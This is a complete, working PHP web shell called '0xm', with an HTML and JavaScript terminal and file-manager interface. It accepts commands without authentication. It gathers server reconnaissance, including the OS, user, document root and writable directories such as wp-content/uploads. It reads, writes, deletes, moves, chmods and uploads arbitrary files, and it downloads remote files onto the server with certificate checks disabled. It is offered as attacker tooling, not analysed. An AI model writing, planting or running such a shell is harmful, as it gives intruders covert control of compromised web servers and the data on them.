<?php
@error_reporting(0);@set_time_limit(0);@ini_set('display_errors',0);@ob_start();

function xwrite($p,$d){
    if(!@is_dir(dirname($p)))@mkdir(dirname($p),0755,true);
    if(@file_put_contents($p,$d)!==false)return'OK';
    $h=@fopen($p,'wb');if($h){@fwrite($h,$d);@fclose($h);return'OK';}
    try{$s=new SplFileObject($p,'wb');$s->fwrite($d);$s=null;return'OK';}catch(Throwable$e){}
    return'FAIL';
}

function xfetch($url,$saveto=null){
    $d=null;
    if(function_exists('curl_init')){
        $c=curl_init($url);
        curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_TIMEOUT=>20,CURLOPT_USERAGENT=>'Mozilla/5.0']);
        $d=curl_exec($c);curl_close($c);
    }
    if(!$d&&@ini_get('allow_url_fopen')){
        $ctx=stream_context_create(['http'=>['timeout'=>20,'user_agent'=>'Mozilla/5.0'],'ssl'=>['verify_peer'=>false]]);
        $d=@file_get_contents($url,false,$ctx);
    }
    if(!$d)return['ok'=>false,'err'=>'failed'];
    if($saveto){$r=xwrite($saveto,$d);return['ok'=>$r==='OK','bytes'=>strlen($d)];}
    return['ok'=>true,'bytes'=>strlen($d),'data'=>base64_encode($d)];
}

function _fe($f){static$c=[];if(!isset($c[$f]))$c[$f]=function_exists($f);return$c[$f];}
function xrecon(){
    $un='php_uname';
    $cwd=@getcwd()?:__DIR__;
    $dt=_fe('disk_total_space')?@disk_total_space($cwd):false;
    $df=_fe('disk_free_space')?@disk_free_space($cwd):false;
    $fmt=function($b){if(!$b)return'?';return$b>=1<<30?round($b/(1<<30),2).'G':($b>=1<<20?round($b/(1<<20),1).'M':round($b/1024,1).'K');};
    $wr=[];$tmp=_fe('sys_get_temp_dir')?@sys_get_temp_dir():'';
    foreach(array_unique([$cwd,$tmp,
        $_SERVER['DOCUMENT_ROOT']??'',
        ($_SERVER['DOCUMENT_ROOT']??'').'/wp-content/uploads'])as$d)
        if($d&&@is_dir($d))$wr[$d]=@is_writable($d)?'W':'R';
    return[
        'os'=>PHP_OS,'uname'=>function_exists($un)?$un('a'):PHP_OS,
        'hostname'=>function_exists($un)?$un('n'):'?',
        'user'=>_fe('get_current_user')?@get_current_user():'?',
        'uid'=>_fe('getmyuid')?@getmyuid():-1,
        'server'=>$_SERVER['SERVER_SOFTWARE']??'?',
        'document_root'=>$_SERVER['DOCUMENT_ROOT']??'?',
        'cwd'=>$cwd,'script'=>__FILE__,
        'php'=>PHP_VERSION,'sapi'=>PHP_SAPI,
        'open_basedir'=>@ini_get('open_basedir')?:'none',
        'allow_url_fopen'=>@ini_get('allow_url_fopen')?'ON':'OFF',
        'curl'=>_fe('curl_init')?'ON':'OFF',
        'disk'=>$fmt($df).' free / '.$fmt($dt).' total',
        'writable'=>$wr,
    ];
}

function xls($p){
    $p=@realpath($p)?:$p;
    if(!@is_dir($p))return['error'=>'not a dir'];
    $out=[];
    $files=@scandir($p);
    if($files===false){
        $files=[];$dh=@opendir($p);
        if($dh){while(($f=readdir($dh))!==false)$files[]=$f;closedir($dh);}
    }
    foreach($files as$f){
        if($f==='.'||$f==='..')continue;
        $fp=$p.'/'.$f;
        $out[]=['n'=>$f,'t'=>@is_dir($fp)?'d':'f',
                's'=>@is_file($fp)?(@filesize($fp)?:0):0,
                'w'=>@is_writable($fp)];
    }
    usort($out,function($a,$b){return $a['t']!==$b['t']?strcmp($a['t'],$b['t']):strcmp($a['n'],$b['n']);});
    return['path'=>$p,'items'=>$out];
}

$SHELLDIR=dirname(__FILE__);
function _abspath($p,$base=null){
    if(!$p)return'';
    if($p[0]==='/')return$p;
    return($base?:$GLOBALS['SHELLDIR']).'/'.ltrim($p,'/');
}
$a=$_POST['a']??$_GET['a']??'';

if($a==='recon'){header('Content-Type:application/json');die(json_encode(xrecon()));}

if($a==='ls'){
    $p=$_POST['p']??$_GET['p']??@getcwd();
    header('Content-Type:application/json');die(json_encode(xls($p)));
}

if($a==='read'){
    $p=$_POST['p']??$_GET['p']??'';
    header('Content-Type:application/json');
    if(!$p||!@is_file($p))die(json_encode(['error'=>'not a file']));
    $d=@file_get_contents($p);
    if($d===false){try{$spl=new SplFileObject($p,'r');$d='';while(!$spl->eof())$d.=$spl->fgets();}catch(Throwable$e){$d=false;}}
    die(json_encode($d!==false?['content'=>base64_encode($d)]:['error'=>'unreadable']));
}

if($a==='write'){
    $p=_abspath($_POST['p']??'');$d=@base64_decode($_POST['d']??'');
    header('Content-Type:text/plain');
    die($p&&strlen($d)?xwrite($p,$d):'ERR');
}

if($a==='fetch'){
    $url=$_POST['url']??$_GET['url']??'';
    $st=$_POST['p']??$_GET['p']??'';
    if($st!=='')$st=_abspath($st);
    else{
        $bn=basename(parse_url($url,PHP_URL_PATH)?:$url);
        $bn=preg_replace('/[^a-zA-Z0-9._-]/','_',$bn)?:'fetched';
        $st=$SHELLDIR.'/'.$bn;
    }
    header('Content-Type:application/json');
    if(!$url)die(json_encode(['error'=>'url required']));
    $res=xfetch($url,$st);
    $res['saved_to']=$st;
    die(json_encode($res));
}

if($a==='del'){$p=$_POST['p']??'';header('Content-Type:text/plain');die($p&&@unlink($p)?'OK':'FAIL');}
if($a==='mv'){$s=$_POST['s']??'';$d=$_POST['d']??'';header('Content-Type:text/plain');die($s&&$d&&@rename($s,$d)?'OK':'FAIL');}
if($a==='cp'){$s=$_POST['s']??'';$d=$_POST['d']??'';header('Content-Type:text/plain');die($s&&$d&&@copy($s,$d)?'OK':'FAIL');}
if($a==='mkdir'){$p=$_POST['p']??'';header('Content-Type:text/plain');die($p&&@mkdir($p,0755,true)?'OK':'FAIL');}
if($a==='chmod'){$p=$_POST['p']??'';$m=$_POST['m']??'0644';header('Content-Type:text/plain');die($p&&@chmod($p,octdec($m))?'OK':'FAIL');}

if($a==='upload'){
    $p=$_POST['p']??'';
    header('Content-Type:application/json');
    if(!isset($_FILES['f']))die(json_encode(['error'=>'no file']));
    if(!$p)$p=$SHELLDIR.'/'.basename($_FILES['f']['name']);
    else $p=_abspath($p);
    die(json_encode(['status'=>xwrite($p,file_get_contents($_FILES['f']['tmp_name'])),'path'=>$p]));
}

try{$r=xrecon();}catch(Throwable$_e){$r=['os'=>PHP_OS,'uname'=>PHP_OS,'hostname'=>'?','user'=>'?','uid'=>-1,'server'=>'?','document_root'=>'?','cwd'=>__DIR__,'script'=>__FILE__,'php'=>PHP_VERSION,'sapi'=>PHP_SAPI,'open_basedir'=>'?','allow_url_fopen'=>'?','curl'=>'?','disk'=>'?','writable'=>[]];}
$cwd_ui=$r['cwd'];
?><!doctype html><html><head><meta charset="utf-8">
<title><?=htmlspecialchars($r['hostname'])?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d0d0d;color:#c9c9c9;font:13px/1.5 'Consolas','Courier New',monospace}
#w{max-width:1100px;margin:0 auto;padding:12px}
h1{font-size:14px;color:#7eb8f7;padding:8px 0 10px;border-bottom:1px solid #1e1e1e;margin-bottom:12px}
h1 em{color:#e06c75;font-style:normal;font-size:12px;margin-left:8px}
.g2{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px}
.box{background:#111;border:1px solid #1e1e1e;border-radius:3px;padding:9px}
.box h2{font-size:10px;color:#61afef;text-transform:uppercase;letter-spacing:1px;margin-bottom:7px}
.kv{display:flex;gap:6px;font-size:11px;margin:1px 0}
.k{color:#61afef;min-width:110px}.v{color:#98c379;word-break:break-all}
.v.w{color:#e5c07b}.v.b{color:#e06c75}
#T{background:#080808;border:1px solid #1e1e1e;border-radius:3px;margin-bottom:10px}
#To{min-height:100px;max-height:260px;overflow-y:auto;padding:9px;font-size:12px;white-space:pre-wrap;color:#abb2bf;border-bottom:1px solid #1e1e1e}
#Ti{display:flex;padding:5px 9px;gap:7px;align-items:center}
#Ti span{color:#7eb8f7}
#Tc{flex:1;background:none;border:none;outline:none;color:#c9c9c9;font:13px 'Consolas',monospace}
#F{background:#111;border:1px solid #1e1e1e;border-radius:3px;padding:9px;margin-bottom:10px}
#F h2{font-size:10px;color:#61afef;text-transform:uppercase;letter-spacing:1px;margin-bottom:7px;display:flex;justify-content:space-between}
#Fl{max-height:200px;overflow-y:auto}
.fi{display:flex;align-items:center;gap:5px;padding:2px 3px;font-size:12px}
.fi:hover{background:#181818}
.fn{flex:1;color:#abb2bf}.fn.d{color:#7eb8f7;cursor:pointer}.fn.d:hover{text-decoration:underline}
.fs{color:#333;min-width:55px;text-align:right;font-size:11px}.fw{color:#3a3;font-size:10px;width:10px}
.fa button{background:#1a1a1a;border:1px solid #252525;color:#777;font-size:10px;padding:1px 5px;border-radius:2px;cursor:pointer;margin-left:2px}
.fa button:hover{color:#fff;border-color:#444}
#A{background:#111;border:1px solid #1e1e1e;border-radius:3px;padding:9px}
#A h2{font-size:10px;color:#61afef;text-transform:uppercase;letter-spacing:1px;margin-bottom:7px}
.row{display:flex;gap:7px;align-items:center;margin-bottom:6px}
.row label{color:#61afef;font-size:11px;min-width:55px}
input[type=text]{background:#080808;border:1px solid #252525;color:#c9c9c9;padding:3px 7px;font:12px 'Consolas',monospace;border-radius:2px;flex:1}
input[type=text]:focus{outline:none;border-color:#7eb8f7}
input[type=file]{color:#777;font-size:11px}
.btn{background:#152030;border:1px solid #1e3a55;color:#7eb8f7;padding:3px 10px;font:12px 'Consolas',monospace;border-radius:2px;cursor:pointer}
.btn:hover{background:#1e3a55;color:#fff}
#As{font-size:11px;color:#98c379;margin-top:4px;min-height:14px}
</style></head><body>
<div id="w">
<h1>0xm <em><?=htmlspecialchars($r['user'])?>@<?=htmlspecialchars($r['hostname'])?></em></h1>
<div class="g2">
<div class="box"><h2>Server</h2>
<?php foreach(['OS'=>$r['uname'],'User'=>$r['user'].' uid='.$r['uid'],'Hostname'=>$r['hostname'],'Server'=>$r['server'],'DocRoot'=>$r['document_root'],'CWD'=>$r['cwd']]as$k=>$v):?>
<div class="kv"><span class="k"><?=htmlspecialchars($k)?></span><span class="v"><?=htmlspecialchars($v)?></span></div>
<?php endforeach;?>
</div>
<div class="box"><h2>PHP</h2>
<?php foreach(['PHP'=>$r['php'].' ('.$r['sapi'].')','open_basedir'=>$r['open_basedir'],'allow_url_fopen'=>$r['allow_url_fopen'],'cURL'=>$r['curl'],'Disk'=>$r['disk']]as$k=>$v):?>
<div class="kv"><span class="k"><?=htmlspecialchars($k)?></span><span class="v"><?=htmlspecialchars($v)?></span></div>
<?php endforeach;?>
<div style="margin-top:6px;padding-top:5px;border-top:1px solid #1a1a1a">
<?php foreach($r['writable']as$p=>$s):?>
<div class="kv"><span class="k" style="min-width:0;flex:1;font-size:10px"><?=htmlspecialchars($p)?></span><span class="v" style="min-width:12px"><?=$s?></span></div>
<?php endforeach;?></div>
</div>
</div>
<div id="T">
<div id="To">Commands: ls [path]  cd  cat  fetch &lt;url&gt; [dst]  write &lt;path&gt; &lt;b64&gt;  del  mv  cp  mkdir  pwd
</div>
<div id="Ti"><span>$</span><input id="Tc" type="text" autocomplete="off" autofocus></div>
</div>
<div id="F">
<h2><span>Files</span><span id="Fpath" style="font-size:10px;color:#555;font-weight:normal"></span></h2>
<div id="Fl"></div>
</div>
<div id="A"><h2>Actions</h2>
<div class="row"><label>Fetch URL</label><input type="text" id="Au" placeholder="https://..."><input type="text" id="Ap" placeholder="/save/to/path" style="max-width:200px"><button class="btn" onclick="doFetch()">Fetch</button></div>
<div class="row"><label>Write file</label><input type="file" id="Af"><input type="text" id="Afp" placeholder="/save/to/path  (kosong = shell dir)"><button class="btn" onclick="doUpload()">Write</button></div>
<div id="As"></div>
</div>
</div>
<script>
const BASE=location.pathname;
function post(d){return fetch(BASE,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(d)});}
const To=document.getElementById('To'),Tc=document.getElementById('Tc');
let cwd='<?=addslashes($cwd_ui)?>',hist=[],hi=-1;
function out(s){To.textContent+=s+'\n';To.scrollTop=To.scrollHeight;}
Tc.addEventListener('keydown',async e=>{
    if(e.key==='ArrowUp'){e.preventDefault();if(hi<hist.length-1)Tc.value=hist[++hi];return;}
    if(e.key==='ArrowDown'){e.preventDefault();if(hi>0)Tc.value=hist[--hi];else{hi=-1;Tc.value='';}return;}
    if(e.key!=='Enter')return;
    const raw=Tc.value.trim();if(!raw)return;
    hist.unshift(raw);hi=-1;Tc.value='';out('$ '+raw);
    const pts=raw.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g)||[];
    const cmd=pts[0]?.toLowerCase();
    const a1=(pts[1]||'').replace(/^['"]|['"]$/g,'');
    const a2=(pts[2]||'').replace(/^['"]|['"]$/g,'');
    const abs=s=>s?(/^\//.test(s)?s:cwd+'/'+s):cwd;
    if(cmd==='ls'||cmd==='dir'){const r=await post({a:'ls',p:abs(a1)}).then(r=>r.json());if(r.error){out('[ERR] '+r.error);return;}cwd=r.path;fmLoad(r.path);let o=r.path+':\n';for(const i of r.items)o+=(i.t==='d'?'d':'f')+(i.w?'w':'-')+'  '+(i.t==='f'?(i.s+'').padStart(8):' '.repeat(8))+'  '+i.n+(i.t==='d'?'/':'')+'\n';out(o);return;}
    if(cmd==='cd'){const r=await post({a:'ls',p:abs(a1)}).then(r=>r.json());if(r.error){out('[ERR] '+r.error);}else{cwd=r.path;fmLoad(r.path);out('→ '+cwd);}return;}
    if(cmd==='cat'||cmd==='read'){const r=await post({a:'read',p:abs(a1)}).then(r=>r.json());if(r.error){out('[ERR] '+r.error);return;}const t=new TextDecoder().decode(Uint8Array.from(atob(r.content),c=>c.charCodeAt(0)));out(t.slice(0,8000)+(t.length>8000?'\n...(truncated)':''));return;}
    if(cmd==='fetch'){const r=await post({a:'fetch',url:a1,p:a2||''}).then(r=>r.json());out(JSON.stringify(r));if(a2&&r.ok)fmLoad(cwd);return;}
    if(cmd==='write'){const r=await post({a:'write',p:abs(a1),d:a2}).then(r=>r.text());out(r);fmLoad(cwd);return;}
    if(cmd==='del'||cmd==='rm'){const r=await post({a:'del',p:abs(a1)}).then(r=>r.text());out(r);fmLoad(cwd);return;}
    if(cmd==='mv'||cmd==='rename'){const r=await post({a:'mv',s:abs(a1),d:abs(a2)}).then(r=>r.text());out(r);fmLoad(cwd);return;}
    if(cmd==='cp'||cmd==='copy'){const r=await post({a:'cp',s:abs(a1),d:abs(a2)}).then(r=>r.text());out(r);fmLoad(cwd);return;}
    if(cmd==='mkdir'){const r=await post({a:'mkdir',p:abs(a1)}).then(r=>r.text());out(r);fmLoad(cwd);return;}
    if(cmd==='chmod'){const r=await post({a:'chmod',p:abs(a1),m:a2||'0644'}).then(r=>r.text());out(r);return;}
    if(cmd==='pwd'){out(cwd);return;}
    if(cmd==='recon'){const r=await post({a:'recon'}).then(r=>r.json());out(JSON.stringify(r,null,2));return;}
    out('[?] Unknown: '+cmd);
});
async function fmLoad(p){
    p=p||cwd;
    const r=await post({a:'ls',p}).then(r=>r.json()).catch(()=>({error:'failed'}));
    if(r.error){document.getElementById('Fl').innerHTML='<span style="color:#e06c75;font-size:11px">'+r.error+'</span>';return;}
    cwd=r.path;document.getElementById('Fpath').textContent=r.path;
    const par=r.path.replace(/\/[^\/]+$/,'')||'/';
    let h=r.path!=='/'?'<div class="fi"><span class="fn d" onclick="fmLoad(\''+es(par)+'\')">../</span></div>':'';
    for(const i of r.items){const fp=r.path+'/'+i.n;const sz=i.t==='f'?(i.s>1<<20?(i.s>>20)+'M':i.s>1024?(i.s>>10)+'K':i.s+'B'):'';
    h+='<div class="fi">'+(i.t==='d'?'<span class="fn d" onclick="fmLoad(\''+es(fp)+'\')">'+e(i.n)+'/</span>':'<span class="fn">'+e(i.n)+'</span>')+
    '<span class="fs">'+sz+'</span><span class="fw">'+(i.w?'w':'')+'</span><div class="fa">'+
    (i.t==='f'?'<button onclick="fmCat(\''+es(fp)+'\')">cat</button><button onclick="fmDl(\''+es(fp)+'\')">dl</button>':'')+
    '<button onclick="fmDel(\''+es(fp)+'\')">del</button></div></div>';}
    document.getElementById('Fl').innerHTML=h||'<span style="color:#333;font-size:11px">(empty)</span>';
}
function e(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;');}
function es(s){return s.replace(/\\/g,'\\\\').replace(/'/g,"\\'");}
async function fmCat(p){const r=await post({a:'read',p}).then(r=>r.json());if(r.error){out('[ERR] '+r.error);return;}const t=new TextDecoder().decode(Uint8Array.from(atob(r.content),c=>c.charCodeAt(0)));out('── '+p+' ──\n'+t.slice(0,8000));To.scrollTop=To.scrollHeight;}
async function fmDl(p){const r=await post({a:'read',p}).then(r=>r.json());if(r.error){alert(r.error);return;}const a=document.createElement('a');a.href='data:application/octet-stream;base64,'+r.content;a.download=p.split('/').pop();a.click();}
async function fmDel(p){if(!confirm('Delete: '+p))return;await post({a:'del',p});fmLoad(cwd);}
async function doFetch(){const url=document.getElementById('Au').value.trim(),p=document.getElementById('Ap').value.trim();if(!url){document.getElementById('As').textContent='URL required';return;}document.getElementById('As').textContent='...';const r=await post({a:'fetch',url,p}).then(r=>r.json());document.getElementById('As').textContent=(r.ok?'OK saved → '+(r.saved_to||'?')+' ('+r.bytes+' bytes)':JSON.stringify(r));if(r.ok)fmLoad(cwd);}
async function doUpload(){const file=document.getElementById('Af').files[0];if(!file){document.getElementById('As').textContent='Select a file';return;}const p=document.getElementById('Afp').value.trim()||'';document.getElementById('As').textContent='...';const fd=new FormData();fd.append('a','upload');fd.append('f',file);if(p)fd.append('p',p);const r=await fetch(BASE,{method:'POST',body:fd}).then(r=>r.json());document.getElementById('As').textContent=(r.status==='OK'?'OK → '+r.path:JSON.stringify(r));if(r.status==='OK')fmLoad(cwd);}
fmLoad(cwd);
</script></body></html>
